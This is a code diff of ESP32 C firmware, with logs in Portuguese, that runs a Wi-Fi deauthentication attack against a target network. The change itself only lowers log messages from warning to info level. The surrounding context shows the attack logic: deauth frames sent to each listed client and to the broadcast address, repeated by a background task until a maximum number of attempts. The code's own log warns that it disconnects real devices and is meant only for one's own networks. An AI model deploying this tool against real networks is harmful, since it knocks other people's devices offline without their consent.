@@ -58,7 +58,7 @@ static void event_handler(void* arg, esp_event_base_t event_base,
         esp_wifi_connect();
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
         connected_to_target = false;
-        ESP_LOGW(TAG, "\n\n\nDesconectado do alvo! Tentando reconectar...");
+        ESP_LOGI(TAG, "\n\n\nDesconectado do alvo! Tentando reconectar...");
         esp_wifi_connect();
         xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
     } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
@@ -155,7 +155,7 @@ esp_err_t send_deauth_frame(uint8_t* target_mac, uint16_t reason)
     
     if (result == ESP_OK) {
         successful_deauths++;
-        ESP_LOGW(TAG, "DEAUTH ENVIADO para %02x:%02x:%02x:%02x:%02x:%02x (motivo: %d)",
+        ESP_LOGI(TAG, "DEAUTH ENVIADO para %02x:%02x:%02x:%02x:%02x:%02x (motivo: %d)",
                  target_mac[0], target_mac[1], target_mac[2],
                  target_mac[3], target_mac[4], target_mac[5], reason);
     } else {
@@ -169,15 +169,15 @@ esp_err_t send_deauth_frame(uint8_t* target_mac, uint16_t reason)
 void execute_deauth_attack(void)
 {
     if (!connected_to_target || target_client_count == 0) {
-        ESP_LOGW(TAG, "Nao conectado ou sem alvos - pulando ataque");
+        ESP_LOGI(TAG, "Nao conectado ou sem alvos - pulando ataque");
         return;
     }
     
     deauth_attempts++;
     
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "EXECUTANDO ATAQUE DEAUTH #%d", deauth_attempts);
-    ESP_LOGW(TAG, "Enviando deauth para %d clientes...", target_client_count);
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "EXECUTANDO ATAQUE DEAUTH #%d", deauth_attempts);
+    ESP_LOGI(TAG, "Enviando deauth para %d clientes...", target_client_count);
     
     // Enviar deauth para todos os clientes alvo
     for (int i = 0; i < target_client_count; i++) {
@@ -194,40 +194,40 @@ void execute_deauth_attack(void)
     }
     
     // Ataque broadcast (desconectar todos os clientes)
-    ESP_LOGW(TAG, "Enviando deauth broadcast...");
+    ESP_LOGI(TAG, "Enviando deauth broadcast...");
     send_deauth_frame(broadcast_mac, REASON_CODE_UNSPECIFIED);
     
-    ESP_LOGW(TAG, "Ataque deauth completo! Clientes devem ter sido desconectados");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "Ataque deauth completo! Clientes devem ter sido desconectados");
+    ESP_LOGI(TAG, "");
 }
 
 // Função para mostrar estatísticas do ataque
 void show_deauth_stats(void)
 {
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "=== ESTATISTICAS DO ATAQUE DEAUTH ===");
-    ESP_LOGW(TAG, "Alvo: %s", TARGET_SSID);
-    ESP_LOGW(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "=== ESTATISTICAS DO ATAQUE DEAUTH ===");
+    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
+    ESP_LOGI(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
              target_bssid[0], target_bssid[1], target_bssid[2],
              target_bssid[3], target_bssid[4], target_bssid[5]);
-    ESP_LOGW(TAG, "Ataques executados: %d", deauth_attempts);
-    ESP_LOGW(TAG, "Frames deauth enviados: %d", successful_deauths);
-    ESP_LOGW(TAG, "Clientes alvo: %d", target_client_count);
-    ESP_LOGW(TAG, "Status: %s", connected_to_target ? "CONECTADO" : "DESCONECTADO");
-    ESP_LOGW(TAG, "==========================================");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "Ataques executados: %d", deauth_attempts);
+    ESP_LOGI(TAG, "Frames deauth enviados: %d", successful_deauths);
+    ESP_LOGI(TAG, "Clientes alvo: %d", target_client_count);
+    ESP_LOGI(TAG, "Status: %s", connected_to_target ? "CONECTADO" : "DESCONECTADO");
+    ESP_LOGI(TAG, "==========================================");
+    ESP_LOGI(TAG, "");
 }
 
 // Task principal do ataque deauth
 static void deauth_attack_task(void *pvParameters)
 {
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "INICIANDO ATAQUE DEAUTH REAL!");
-    ESP_LOGW(TAG, "Alvo: %s", TARGET_SSID);
-    ESP_LOGW(TAG, "Intervalo: %d ms", DEAUTH_INTERVAL_MS);
-    ESP_LOGW(TAG, "Maximo de tentativas: %d", MAX_DEAUTH_ATTEMPTS);
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "INICIANDO ATAQUE DEAUTH REAL!");
+    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
+    ESP_LOGI(TAG, "Intervalo: %d ms", DEAUTH_INTERVAL_MS);
+    ESP_LOGI(TAG, "Maximo de tentativas: %d", MAX_DEAUTH_ATTEMPTS);
+    ESP_LOGI(TAG, "");
     
     // Aguardar conexão inicial
     while (!connected_to_target) {
@@ -238,7 +238,7 @@ static void deauth_attack_task(void *pvParameters)
     // Gerar clientes alvo
     generate_target_clients();
     
-    ESP_LOGW(TAG, "Iniciando ataque deauth em 3 segundos...");
+    ESP_LOGI(TAG, "Iniciando ataque deauth em 3 segundos...");
     vTaskDelay(pdMS_TO_TICKS(3000));
     
     while (deauth_attempts < MAX_DEAUTH_ATTEMPTS && connected_to_target) {
@@ -254,9 +254,9 @@ static void deauth_attack_task(void *pvParameters)
         vTaskDelay(pdMS_TO_TICKS(DEAUTH_INTERVAL_MS));
     }
     
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "ATAQUE DEAUTH REAL CONCLUIDO!");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "ATAQUE DEAUTH REAL CONCLUIDO!");
+    ESP_LOGI(TAG, "");
     show_deauth_stats();
     
     vTaskDelete(NULL);
@@ -319,13 +319,13 @@ void app_main(void)
     }
     ESP_ERROR_CHECK(ret);
 
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "=== ATACANTE DEAUTH REAL INICIADO ===");
-    ESP_LOGW(TAG, "ATENCAO: Este programa executa ataques deauth REAIS!");
-    ESP_LOGW(TAG, "Ele ira desconectar outros dispositivos da rede!");
-    ESP_LOGW(TAG, "Use apenas em redes proprias para teste!");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "=== ATACANTE DEAUTH REAL INICIADO ===");
+    ESP_LOGI(TAG, "ATENCAO: Este programa executa ataques deauth REAIS!");
+    ESP_LOGI(TAG, "Ele ira desconectar outros dispositivos da rede!");
+    ESP_LOGI(TAG, "Use apenas em redes proprias para teste!");
+    ESP_LOGI(TAG, "");
     
     // Inicializar Wi-Fi
     wifi_init_deauth();
@@ -336,7 +336,7 @@ void app_main(void)
     // Iniciar task de ataque
     xTaskCreate(deauth_attack_task, "deauth_attack_task", 8192, NULL, 5, NULL);
     
-    ESP_LOGW(TAG, "");
-    ESP_LOGW(TAG, "Sistema de ataque deauth REAL ativo!");
-    ESP_LOGW(TAG, "");
+    ESP_LOGI(TAG, "");
+    ESP_LOGI(TAG, "Sistema de ataque deauth REAL ativo!");
+    ESP_LOGI(TAG, "");
 }
